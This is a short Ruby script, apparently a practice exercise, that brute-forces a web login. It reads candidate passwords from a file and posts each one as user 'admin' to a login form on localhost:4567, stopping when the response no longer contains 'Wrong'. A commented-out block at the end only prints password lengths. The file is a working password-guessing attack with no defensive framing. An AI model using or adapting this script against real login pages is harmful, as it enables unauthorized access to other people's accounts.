require 'net/http'

uri = URI('http://localhost:4567/login')
File.new('passwords.txt').each do |line|
  password = line.chomp
  puts "Trying #{password}..."
  res = Net::HTTP.post_form(uri, username: 'admin', password: password)
  if res.body.include?('Wrong')
    # do nothing
  else
    puts "Password found: #{password}"
    exit
  end
end

# f = File.new('passwords.txt')
# f.each do |line|
#   password = line.chomp
#   puts password.size
# end
